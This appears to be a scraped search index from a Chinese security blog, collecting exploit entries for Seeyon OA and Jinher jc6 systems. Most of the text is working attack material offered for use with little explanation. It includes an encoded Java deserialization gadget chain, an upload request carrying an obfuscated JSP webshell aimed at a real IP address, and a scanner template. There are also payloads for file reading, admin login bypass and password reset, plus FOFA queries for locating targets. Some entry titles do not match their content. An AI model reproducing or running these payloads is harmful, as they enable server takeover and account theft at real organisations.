{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m1server-usertokenservice-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"fofa body=\"jc6/platform\" ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc http://222.180.197.70:18888/jc6/upload/2023-08-16/ttt22.jsp POST /jc6/servlet/jcsUploadServlet?mtpId= HTTP/1.1 Host: 222.180.197.70:18888 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=1F974730AB7C793ADF87BB3C82E7619B Connection: close Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Length: 2105 --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"iframeId\" ttt22 --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"fileSuffix\" jsp --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"myFile\"; filename=\"1.txt\" Content-Type: application/octet-stream ;$\u001f\u001fRsqhmf\u001fG08U5\u001f\u003c\u001fqdptdrs-fdsO`q`ldsdq'!o`rr!(:he\u001f'G08U5\u001f \u003c\u001fmtkk(\u001fz\u001fbk`rr\u001fDhAGFJ2B\u001fdwsdmcr.)YcYjC1Y82D).Bk`rrKn`cdq\u001fz\u001fDhAGFJ2B'Bk`rrKn`cdq\u001fKbwRoj(\u001fz\u001frtodq'KbwRoj(:\u001f|\u001fotakhb\u001fBk`rr\u001fG08U5'axsdZ\\\u001fa(\u001fz\u001fqdstqm\u001frtodq-cdehmdBk`rr'a+\u001f/+\u001fa-kdmfsg(:||axsdZ\\\u001faxsdr\u001f\u003c\u001fmtkk:sqx\u001fzhmsZ\\\u001f``\u001f\u003c\u001fmdv\u001fhmsZ\\z88+\u001f0/0+\u001f015+\u001f51+\u001f014+\u001f010+\u001f88+\u001f004+\u001f51+\u001f71+\u001f70+\u001f56+\u001f74+\u001f27+\u001f25+\u001f73+\u001f006+\u001f004+\u001f016+\u001f005+\u001f006+\u001f87|:\u001fRsqhmf\u001fbbrsq\u001f\u003c\u001f!!:enq\u001f'hms\u001fh\u001f\u003c\u001f/:\u001fh\u001f;\u001f``-kdmfsg:\u001fh**(\u001fz``Zh\\\u001f\u003c\u001f``Zh\\\u001f]\u001f/w/0/:\u001fbbrsq\u001f\u003c\u001fbbrsq\u001f*\u001f'bg`q(\u001f``Zh\\:|Bk`rr\u001f@8BSn\u001f\u003c\u001fBk`rr-enqM`ld'bbrsq(:Rsqhmf\u001fj\u001f\u003c\u001fmdv\u001fRsqhmf'mdv\u001faxsdZ\\z0//+0/0+88+000+0//+0/0+55+006+0/1+0/1+0/0+003|(:axsdr\u001f\u003c\u001f'axsdZ\\(\u001f@8BSn-fdsLdsgnc'j+\u001fRsqhmf-bk`rr(-hmunjd'@8BSn-mdvHmrs`mbd'(+\u001fG08U5(:|b`sbg\u001f'Dwbdoshnm\u001fd(\u001fzhmsZ\\\u001f``\u001f\u003c\u001fmdv\u001fhmsZ\\z011+\u001f002+\u001f0/1+\u001f002+\u001f51+\u001f0/0+\u001f0//+\u001f010+\u001f013+\u001f51+\u001f71+\u001f002+\u001f88+\u001f006+\u001f27+\u001f25|:Rsqhmf\u001fbbrsq\u001f\u003c\u001f!!:enq\u001f'hms\u001fh\u001f\u003c\u001f/:\u001fh\u001f;\u001f``-kdmfsg:\u001fh**(\u001fz``Zh\\\u001f\u003c\u001f``Zh\\\u001f]\u001f/w/0/:bbrsq\u001f\u003c\u001fbbrsq\u001f*\u001f'bg`q(\u001f``Zh\\:|Bk`rr\u001fbk`yy\u001f\u003c\u001fBk`rr-enqM`ld'bbrsq(:Naidbs\u001fcdbncdq\u001f\u003c\u001fbk`yy-fdsLdsgnc'!fdsCdbncdq!(-hmunjd'mtkk(:axsdr\u001f\u003c\u001f'axsdZ\\(\u001fcdbncdq-fdsBk`rr'(-fdsLdsgnc'!cdbncd!+\u001fRsqhmf-bk`rr(-hmunjd'cdbncdq+\u001fG08U5(:|Bk`rr\u001f`Bk`rr\u001f\u003c\u001fmdv\u001fDhAGFJ2B'Sgqd`c-btqqdmsSgqd`c'(-fdsBnmsdwsBk`rrKn`cdq'((-G08U5'axsdr(:Naidbs\u001fn\u001f\u003c\u001f`Bk`rr-mdvHmrs`mbd'(:n-dpt`kr'o`fdBnmsdws(:|\u001fdkrd\u001fz|\u001f$= --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"attachmentId\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"isSingle\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"fileOldName\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95-- ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"exp detail: ID: 4946 Author: 匿名作者 Name: 金和jc6存在任意文件上传 Description: 金和OA是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。因未对接口进行过滤限制，导致了任意文件的上传，可上传木马从而控制服务器 Identifier: DVB: DVB-2023-4946 VulnClass: - 任意文件上传 Category: - Web服务器集群 Manufacturer: 金和软件 Product: jc6 Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: '2023-08-15' Region: 中国大陆 Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"jc6/platform\" Solutions: - 对上传⽂件的⼤⼩和类型进⾏校验，定义上传⽂件类型⽩名单。 poc: relative: req0 \u0026\u0026 req1 session: false get_variables: - year: getNowTime(\"Year\") - month: getNowTime(\"Month\") - day: getNowTime(\"Day\") - randomstr: randomLowerCase(5) - payload: base64Decode(\"LS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaWZyYW1lSWQiDQoNCnR0dDY2Ng0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZVN1ZmZpeCINCg0KanNwDQotLTU0ZjZiMDBlMzVjYTc2NWQ2NGE5Nzc2YzU5M2JmZTI5OGIyNGIwNmJjMTdiMjlhMDM2NGM0MGNkZWE5NQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJteUZpbGUiOyBmaWxlbmFtZT0iMS50eHQiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSAgb3V0LnByaW50bG4oInRlc3QxMjMzMzMzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iYXR0YWNobWVudElkIg0KDQoNCi0tNTRmNmIwMGUzNWNhNzY1ZDY0YTk3NzZjNTkzYmZlMjk4YjI0YjA2YmMxN2IyOWEwMzY0YzQwY2RlYTk1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImlzU2luZ2xlIg0KDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZU9sZE5hbWUiDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUtLQ0K\") requests: - method: POST timeout: 10 path: /jc6/servlet/jcsUploadServlet?mtpId= headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.1141.87 Safari/537.36 Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 data: '{{payload}}' follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"OK\")) - method: GET timeout: 10 path: /jc6/upload/{{year}}-{{month}}-{{day}}/ttt666.jsp headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3187.54 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"test1233333\")) `` ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":["2023hw"],"title":"致远OA M1Server userTokenService 远程命令执行漏洞","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"致远OA M3 Server 反序列化漏洞 致远 M3 反序列化 远程命令执行漏洞（XVE-2023-24878） 漏洞信息： https://x.threatbook.com/v5/vul/6bf25402a41b4fc27497a5b42a8421d7ef38d57cb7d8143dedb9a6f438310a2d9e083c39c56fee2571651827b4d9ce8d ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"致远OA M3 Server 反序列化漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"M3-Server 已启动\" 根据群友说，这个漏洞是fastjson反序列化 利用 CB1 生成 hex 反序列化数据，替换 POC 中的 HEX ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"致远OA M3 Server 反序列化漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: Hm_lvt_82116c626a8d504a5c0675073362ef6f=1666334057 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Content-Type: application/json Content-Length: 3680 [{\"userMessageId\":\"{\\\"@\\u0074\\u0079\\u0070\\u0065\\\":\\\"\\u0063\\u006f\\u006d\\u002e\\u006d\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u002e\\u0076\\u0032\\u002e\\u0063\\u0033\\u0070\\u0030\\u002e\\u0057\\u0072\\u0061\\u0070\\u0070\\u0065\\u0072\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0050\\u006f\\u006f\\u006c\\u0044\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\\",\\\"\\u0075\\u0073\\u0065\\u0072\\u004f\\u0076\\u0065\\u0072\\u0072\\u0069\\u0064\\u0065\\u0073\\u0041\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\\":\\\"\\u0048\\u0065\\u0078\\u0041\\u0073\\u0063\\u0069\\u0069\\u0053\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u004d\\u0061\\u0070:HEX;\\\"}|\",\"channelId\":\"111\",\"title\":\"111\",\"content\":\"222\",\"deviceType\":\"androidphone\",\"serviceProvider\":\"baidu\",\"deviceFirm\":\"other\"}] 然后再 Get 访问/mobile_portal/api/systemLog/pns/loadLog/app.log ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"致远OA M3 Server 反序列化漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://mp.weixin.qq.com/s/czbhaf7jpNmgjAt-OFWmIA ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"致远OA M3 Server 反序列化漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-m3-server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"致远OA wpsAssistServlet任意文件读取漏洞 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"致远OA wpsAssistServlet任意文件读取漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /seeyon/wpsAssistServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive Content-Length: 47 Content-Type: application/x-www-form-urlencoded flag=template\u0026templateUrl=C:/windows/system.ini ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"致远OA wpsAssistServlet任意文件读取漏洞","uri":"/%E8%87%B4%E8%BF%9Coa-wpsassistservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"致远OA_V8.1SP2文件上传漏洞 POST /seeyou/ajax.do?method=ajaxAction\u0026managerName=formulaManager\u0026managerMethod=saveFormula4C1oud HTTP/1.1 Host: 1.1.1.1 User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry: 11.0) Accept: text/html, image/gif, image/ipeg, */*; q=.2, */*; q=.2 Accept-Encoding: gzip, deflate Cookie: JSESSIONID Cache-Control: no-cache Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 522729 Connection: close X-Forwarded-For: 1.2.3.4 arguments={\"formulaName\":\"test\",\"formulaAlias\":\"safe_pre\",\"formulaType\":\"2\",\"formulaExpression\":\",\\\"sample\\\",\\\"I\"} ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa_v8.1sp2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"致远OA_V8.1SP2文件上传漏洞","uri":"/%E8%87%B4%E8%BF%9Coa_v8.1sp2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"致远OA任意管理员登录 POST /seeyon/thirdpartyController.do HTTP/1.1 method=access\u0026enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4\u0026clientPath=127.0.0.1 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95/:1:0","tags":["2023hw漏洞"],"title":"致远OA任意管理员登录","uri":"/%E8%87%B4%E8%BF%9Coa%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95/"},{"categories":["2023hw漏洞"],"content":"致远OA前台任意用户密码修改漏洞 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw漏洞"],"title":"致远OA前台任意用户密码修改漏洞","uri":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"版本 Seeyon OA=V5/G6 Seeyon OA=V8.1SP2 Seeyon OA=V8.2 ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"致远OA前台任意用户密码修改漏洞","uri":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1 Host: ip User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/json Accept-Encoding: gzip {\"loginName\":\"admin\",\"password\":\"123456\"} ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"致远OA前台任意用户密码修改漏洞","uri":"/%E8%87%B4%E8%BF%9Coa%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" \u0026\u0026 body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" \u0026\u0026 body=\"seeyon\" \u0026\u0026 body=\"seeyonProductId\") || (body=\"/seeyon/common/\" \u0026\u0026 body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" \u0026\u0026 body=\"/seeyon/\") || banner=\"Server: SY8044\" 